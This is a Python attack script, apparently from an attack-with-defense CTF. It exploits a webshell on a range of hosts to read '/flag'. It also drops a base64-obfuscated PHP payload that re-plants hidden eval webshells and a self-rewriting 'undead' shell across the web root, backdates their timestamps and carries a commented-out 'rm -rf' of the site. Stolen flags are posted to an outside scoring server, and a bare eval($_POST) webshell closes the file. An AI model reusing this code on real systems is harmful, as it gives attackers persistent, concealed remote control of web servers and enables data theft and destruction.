# 小马变大马

import requests
import time
import re

token = 'a4d7c4f3fbaa9cd44e659c5d49ce98cd'
method = 'GET' # GET


filename = '.1.php'
cmd1="system('cat /flag');"
cmd2="file_put_contents('/var/www/html/{}', base64_decode('PD9waHAgCiAgICBmdW5jdGlvbiBteXNjYW5kaXIoJHBhdGgsICYkYXJyKSB7CiAgICAgICAgZm9yZWFjaCAoZ2xvYigkcGF0aCkgYXMgJGZpbGUpIHsKICAgICAgICAgICAgaWYgKGlzX2RpcigkZmlsZSkpIHsKICAgICAgICAgICAgICAgIG15c2NhbmRpcigkZmlsZSAuICcvKicsICRhcnIpOwogICAgICAgICAgICAgICAgJGFycltdID0gcmVhbHBhdGgoJGZpbGUpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgJGFsbGZpbGVzOwogICAgbXlzY2FuZGlyKCcuLycsICAkYWxsZmlsZXMpOwogICAgaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIHVubGluayhfX0ZJTEVfXyk7CiAgICAjbWQ1IHRyb2oKICAgICRmaWxlMSA9ICcvLmZmZi5waHAnOwogICAgJGNvZGUxID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdhV1lvYldRMUtDUmZVRTlUVkZzbmNHRnpjeWRkS1QwOUp6VmtZVGM0TVRjd1lUSXdOemM0TTJFd09XVXhOemxrTkRnNFpqUmhPV016SnlsQVpYWmhiQ2drWDFCUFUxUmJKMk50WkNkZEtUcy9QZz09Jyk7CiAgICAjdW5kZWFkIHRyb2oKICAgICRmaWxlMiA9ICcvLjMzMy5waHAnOwogICAgJGNvZGUyID0gYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdDaUFnSUNCcFoyNXZjbVZmZFhObGNsOWhZbTl5ZENoMGNuVmxLVHNLSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnZFc1c2FXNXJLRjlmUmtsTVJWOWZLVHNLSUNBZ0lDUm1hV3hsSUQwZ0p5NHZMbVptWmk1d2FIQW5Pd29nSUNBZ0pHTnZaR1VnUFNCaVlYTmxOalJmWkdWamIyUmxLQ2RRUkRsM1lVaEJaMkZYV1c5aVYxRXhTME5TWmxWRk9WUldSbk51WTBkR2VtTjVaR1JMVkRBNVNucFdhMWxVWXpSTlZHTjNXVlJKZDA1Nll6Uk5Na1YzVDFkVmVFNTZiR3RPUkdjMFdtcFNhRTlYVFhwS2VXeEJXbGhhYUdKRFoydFlNVUpRVlRGU1lrb3lUblJhUTJSa1MxUnpMMUJuUFQwbktUc0tJQ0FnSUhkb2FXeGxJQ2d4S1hzS0lDQWdJQ0FnSUNCemVYTjBaVzBvSjNSdmRXTm9JQzF0SUMxa0lDSXlNREl4TFRFeUxUQXhJREE1T2pFd09qRXlJaUFuSUM0Z0pHWnBiR1VwT3dvZ0lDQWdJQ0FnSUdsbUtHMWtOU2htYVd4bFgyZGxkRjlqYjI1MFpXNTBjeWdrWm1sc1pTa3BJVDA5YldRMUtDUmpiMlJsS1NrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0JtYVd4bFgzQjFkRjlqYjI1MFpXNTBjeWdrWm1sc1pTd2dKR052WkdVcE93b2dJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQWpjM2x6ZEdWdEtDSm1hVzVrSUM5MllYSXZkM2QzTDJoMGJXd3ZJQzF1WVcxbElDNW1hWE5vTG5Cb2NDQjhJSGhoY21keklISnRJQzF5WmlJcE93b2dJQ0FnSUNBZ0lIVnpiR1ZsY0NneE1EQXBPd29nSUNBZ2ZRby9QZz09Jyk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZm9yZWFjaCgkYWxsZmlsZXMgYXMgJHBhdGgpewogICAgICAgICAgICBpZihtZDUoZmlsZV9nZXRfY29udGVudHMoJHBhdGguJGZpbGUxKSkhPT1tZDUoJGNvZGUxKSkgewogICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJHBhdGguJGZpbGUxLCAkY29kZTEpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHN5c3RlbSgndG91Y2ggLW0gLWQgIjIwMjEtMTItMDEgMDk6MTA6MTIiICcgLiRwYXRoLiRmaWxlMSk7CiAgICAgICAgICAgIGlmKG1kNShmaWxlX2dldF9jb250ZW50cygkcGF0aC4kZmlsZTIpKSE9PW1kNSgkY29kZTIpKSB7CiAgICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkcGF0aC4kZmlsZTIsICRjb2RlMik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc3lzdGVtKCd0b3VjaCAtbSAtZCAiMjAyMS0xMi0wMSAwOToxMDoxMiIgJyAuJHBhdGguJGZpbGUyKTsKICAgICAgICAgICAgI3N5c3RlbSgicm0gLXJmIC92YXIvd3d3L2h0bWwvKiAhKC5mZmYucGhwKSIpOwogICAgICAgICAgICB1c2xlZXAoMTAwKTsKICAgICAgICB9CiAgICB9'));".format(filename)

def exp(url, cmd):
    if method == 'POST':
        payload={
            "1":cmd
        }
        response = requests.post(url, payload, timeout=10)
    else:
        response = requests.get(url + '?seach=' + cmd, timeout=10)
    return response

while 1:
    for i in range(11, 21):
        url="http://173.31.3.{}".format(i)
        shell="framework/admin/registerl_control.php"
        port='80'
        url1=url+'/'+shell    

        try:    # 上大马.1.php
            response2=exp(url1, cmd2)
            url2 = url+'/'+ filename
            requests.get(url2, timeout=1)
        except Exception as e:
            pass

        try:    # 拿flag
            response=exp(url1,cmd1)
            response.encoding=response.apparent_encoding
            # print(response.text)

            if 'flag' in response.text:
                file=open("flag.txt","a")
                file.write(response.text)
                file.close()
                flag = response.text.replace('\n','').replace('\r','')
                # flag = re.match('flag{.*}', flag).group()
                print(flag)
                checkurl = 'http://223.112.5.142:8088/api/ct/web/awd_race/race/014ae3eb8dfbb1ff8bfdb21e5943908b/flag/robot/'
                answer={
                    "flag":flag,
                    "token":token
                }
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json"
                }
                r = requests.post(checkurl, json=answer, headers=headers, timeout=2)
                r.encoding=response.apparent_encoding
                if '"is_pass":true' in r.text:
                    print("get flag: "+url1 + " " + flag)
        except Exception as e:
            pass
    time.sleep(600)

    # <?php eval($_POST[1]);